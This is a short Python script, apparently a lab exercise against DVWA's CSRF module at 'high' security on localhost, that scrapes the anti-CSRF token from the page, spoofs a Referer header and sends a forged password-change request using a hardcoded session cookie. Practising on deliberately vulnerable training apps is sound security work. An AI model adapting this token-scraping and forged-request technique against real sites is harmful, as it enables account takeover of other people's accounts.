import requests
import re

baseUrl = "http://localhost/DVWA/vulnerabilities/csrf/"

cookies = {
    "PHPSESSID": "19b9fc1dc43c16bd1efaf70c819a8f25",
    "security": "high"
}

pattern = r"name='user_token' value='([a-fA-F0-9]+)'"

def getCSRFToken():
    try:
        # Take CSRF Token
        res = requests.get(baseUrl, cookies=cookies)

        match = re.search(pattern, res.text)
        if match:
            token = match.group(1)
            
            return token
        else:
            print("Failed to taken token")
            return False
    except requests.exceptions.RequestException as e:
        print("Request error:", e)

def changePassword(user_token):
    newPassword = input('Enter new password: ')

    headers = {
        "Referer": "http://localhost/DVWA/vulnerabilities/csrf/"
    }

    url = baseUrl + f"?password_new={newPassword}&password_conf={newPassword}&Change=Change&user_token={user_token}"

    try:
        res = requests.get(url, cookies=cookies, headers=headers)

        if "Password Changed" in res.text:
            print('Successfully change password')
        else:
            print('Failed to change password')
            print(res.text)
    except requests.exceptions.RequestException as e:
        print("Request error:", e)

user_token = getCSRFToken()
if (user_token):
    changePassword(user_token)
